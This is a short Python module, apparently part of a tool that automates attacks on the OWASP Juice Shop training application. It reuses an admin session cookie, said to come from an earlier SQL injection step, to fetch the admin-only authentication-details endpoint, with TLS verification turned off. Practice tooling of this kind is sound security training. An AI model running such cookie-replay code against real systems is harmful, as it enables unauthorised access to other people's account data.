from . import attack as a
from .header_config import *
import http.cookiejar as cookielib

class admin_section(a.attack_inter):
    def __init__(self):
        # First trying to load cookies from local cookie file
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/authentication-details'

    def generator(self):
        header = a.TEST_HEADER
        cookie = a.load_cookie('admin')
        return cookie, header

    def run(self):
        cookie,header = self.generator()
        print("1")
        if cookie:
            print("2")
            response = self.juice_session.get(self.url, cookies=cookie, headers=header ,verify=False)
            print("3")
            #print(response.text)
            if response.status_code == 304 or response.status_code == 200:
                print("4")
                print("successfully get admin dashboard")
                print(response.text)
            print(response.status_code)
        else:
            print("Not have authentification yet, please try SQL injection first")
            print("2.1")
